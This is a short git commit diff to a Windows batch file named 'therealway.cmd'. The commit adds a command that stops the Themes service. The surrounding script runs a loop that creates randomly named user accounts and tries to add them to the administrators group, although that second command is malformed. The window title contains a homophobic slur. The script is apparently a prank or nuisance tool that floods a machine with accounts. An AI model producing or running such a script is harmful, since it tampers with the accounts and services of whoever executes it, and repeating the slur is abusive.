4b206e375cd798772fabd9cbbb8bcfb0fe399360
2003ryans <ryanscales@yahoo.com>
2016-07-22 20:56:55 +0000

    asd

--- therealway.cmd
+++ therealway.cmd
@@ -1,5 +1,6 @@
 @echo off
 title I'm such a faggot... I'm going to make a bunch of users because FORKIES'D XDDXXDXDDXDXDXDX
+net stop themes
 :itbegins
 net user SHITHEAD%random% /add
 net user localgroup administrators SHITHEAD%random% /add
